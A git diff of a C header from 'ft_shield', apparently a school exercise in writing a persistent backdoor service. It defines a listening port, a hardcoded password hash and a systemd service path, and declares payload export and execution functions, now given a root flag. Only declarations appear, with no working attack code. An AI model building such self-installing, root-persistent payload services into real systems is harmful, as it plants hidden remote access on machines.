@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/24 16:32:32 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/27 14:33:37 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,7 +19,6 @@
 # include <fcntl.h>
 # include <time.h>
 # include <openssl/evp.h>
-# include "prod.h"
 # include <netdb.h>
 
 # define SWORD_PORT	7003
@@ -51,16 +50,6 @@ stats: see stats about the socket/users\n\
 # define PASSWORD "c2b9ce9e110fe946e9bf5e63becb6e70"
 # define LOGIN_42 "mbatty"
 # define LOCK_FILE "/var/lock/ft_shield.lock"
-
-#  if PROD == 1
-#   define SERVER_PORT 4242
-#   define LOG_FILE "/var/log/ft_shield.log"
-#   define BIN_FT_SHIELD "/bin/ft_shield"
-#  else
-#   define SERVER_PORT 7002
-#   define LOG_FILE "/tmp/ft_shield.log"
-#   define BIN_FT_SHIELD "/tmp/binft_shield"
-#  endif
 
 # define SERVICE_FILE "/etc/systemd/system/ft_shield.service"
 
@@ -94,6 +83,7 @@ typedef struct s_ctx
 	int			log_fd;
 	int			lock_fd;
 	bool		running;
+	bool		is_root;
 }	t_ctx;
 
 int	ctx_init(t_ctx *ctx);
@@ -110,7 +100,7 @@ const char	*logger_get_log_header(t_log_type type);
 void	logger_log_timestamp(int fd);
 void	logger_log(t_ctx *ctx, t_log_type type, char *str, ...);
 
-int	export_payload(char *src_path, char *dst_path);
+int		export_payload(bool root, char *src_path, char *dst_path);
 void	exec_payload(char *payload_path, char **envp);
 
 #endif
